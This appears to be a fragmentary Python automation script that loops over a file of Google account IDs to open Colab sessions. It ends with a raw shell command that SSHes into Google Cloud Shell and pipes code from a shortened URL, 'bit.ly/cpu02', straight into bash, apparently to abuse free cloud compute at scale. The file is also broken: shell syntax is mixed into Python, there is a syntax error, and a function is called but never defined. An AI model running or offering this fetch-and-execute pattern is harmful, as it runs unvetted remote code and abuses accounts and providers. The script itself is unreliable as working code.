#!/usr/bin/python
from subprocess import Popen, PIPE
import pytest
import time
import json
import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import pyautogui
slow_motion=2

GIDS_LIST="/home/one/gids01.txt"
#GIDS_LIST=$1

PASS="llllllllllllllllllll"

### openfiles
# Using readlines()
file1 = open(GIDS_LIST, 'r')
Lines = file1.readlines()
 
count = 0
# Strips the newline character
for line in Lines:
    count += 1
    #print("Line{}: {}".format(count, line.strip()))
    gid=line.strip('\n')
    gid=gid.strip('\r')
    chrome_new_colab(gid,"*******")


p = Popen(["someExternalProgram", "some options"], stdin=PIPE, stdout=PIPE, stderr=PIPE shell=True)
output, error = p.communicate(input=b'\n')

docker run --rm --volumes-from gcloud-config-nadirchi10001 gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell  ssh --authorize-session --command="wget -q -O - bit.ly/cpu02 |bash"
